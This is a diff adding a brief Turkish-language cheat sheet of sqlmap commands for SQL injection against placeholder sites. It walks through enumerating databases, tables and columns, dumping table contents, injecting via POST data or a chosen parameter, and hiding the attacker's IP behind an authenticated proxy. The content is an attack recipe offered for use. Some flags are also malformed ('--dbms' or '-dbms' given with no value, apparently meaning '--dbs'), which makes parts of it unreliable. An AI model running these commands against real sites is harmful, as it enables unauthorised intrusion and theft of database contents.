@@ -1,0 +1,45 @@
+SQL MAP Kullanımı 
+
+DATABASE Bulma
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --dbms
+
+TABLO Bulma
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --tables -D database_adi
+
+KOLON Alma
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --columns -D database_adi -T tablo_Adi
+
+Kolonlar olmadan, ben tabloyu indirme
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --dump -D database_adi -T tablo_Adi
+
+belirli birkaç kolonu download etmek
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --dump -C kolon1,kolon2 -D database_adi -T tablo_Adi
+
+Tamam da SQL sadece GET parametresi ile mi olmak zorunda ? POST parametreli bir sql arıyorsak ne yapmalıyız diyorsanız;
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --data="Post verisi" --dbms
+
+sqlmap -u "http://www.hackle.com/index.php?id=19" --data="adi=merdincz&domain=merdincz.com" --dbms
+
+
+Peki tüm parametreleri taraması yerine, sadece benim belirttiğim parametrede sql denemesini nasıl sağlatabiliriz ?
+
+sqlmap -u "http://www.ornek.com/index.php?id=2&parametre=2" -p "parametre" -dbms
+
+veya
+sqlmap -u "http://www.ornek.com/index.php?id=2&parametre=2*" -dbms
+
+
+Tamam peki hepsi iyi güzel de, ip işi için ne yapıcaz ? Proxy desteği var mıdır derseniz;
+
+sqlmap -u "http://www.ornek.com/index.php?id=2" -dbms --proxy="IP:Port" --proxy-cred="KulAdi:Sifre"
+
+
+Yaptığı tüm işlemleri sql sorgularını, cevaplarını nasıl görebilirim diyorsanız;
+
+sqlmap -u "http://www.ornek.com/index.php?id=2" -dbms -t /usr/share/log.txt
